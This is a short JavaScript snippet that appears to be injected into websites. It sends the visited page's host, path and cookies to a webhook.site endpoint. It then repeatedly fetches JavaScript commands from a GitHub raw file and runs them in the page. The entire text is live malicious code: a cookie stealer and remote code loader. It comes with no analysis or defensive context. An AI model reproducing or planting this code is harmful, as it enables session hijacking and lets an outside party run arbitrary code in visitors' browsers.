(function(){
var R="https://raw.githubusercontent.com/polootyyy/cdnx/main/";
var W="https://webhook.site/e4e989f5-dfd9-487d-807d-d8023425485d";
function o(t,d){try{new Image().src=W+"/h?t="+t+"&d="+encodeURIComponent(String(d).slice(0,300))+"&r="+Math.random()}catch(e){}}
function run(){
 fetch(R+"cmd.json?x="+Math.random()).then(function(r){return r.text()}).then(function(t){
   var c=null;try{c=JSON.parse(t)}catch(e){o("badcmd",t.slice(0,60))}
   if(!c||!c.js){o("nocmd","");return}
   try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s)}catch(e){o("execerr",e)}
 }).catch(function(){o("fetchcmd","x")})
}
o("agent",location.host+location.pathname+" || "+document.cookie);
run();
setTimeout(run,4000);
})();
